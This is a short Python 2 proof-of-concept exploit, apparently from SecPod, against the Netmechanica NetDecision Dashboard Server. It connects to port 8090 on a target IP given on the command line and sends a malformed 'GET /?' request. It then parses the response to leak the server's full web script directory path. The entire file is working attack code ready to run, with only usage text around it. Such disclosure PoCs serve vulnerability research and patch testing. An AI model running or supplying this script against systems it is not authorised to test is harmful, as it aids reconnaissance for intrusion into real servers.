import socket,sys,time
 
 
if len(sys.argv) < 2:
        print "\t[-] Usage: python SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py target_ip"
        print "\t[-] Example : python SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py 127.0.0.1"
        print "\t[-] Exiting..."
        sys.exit(0)
 
port   = 8090
target = sys.argv[1]
 
try:
    socket.inet_aton(target)
except socket.error:
    print "Invalid IP address found ..."
    sys.exit(1)
 
try:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((target,port))
    time.sleep(1)
except:
    print "socket() failed"
    sys.exit(1)
 
exploit = "GET " + "/?" + "HTTP/1.0 "+ "\r\n\r\n"
print "HTTP GET request with '?' filename triggers the vulnerability"
 
data = exploit
sock.sendto(data, (target, port))
res = sock.recv(1024)
sock.close()
 
if res.find('file: ') != -1 :
    print "[+] Full Path of the web script directory of DashBoard Server is ....\r\n"
    print res.split('file: ')[1]
else:
    print "[+] Did not get the source path ..."
 
sys.exit(1)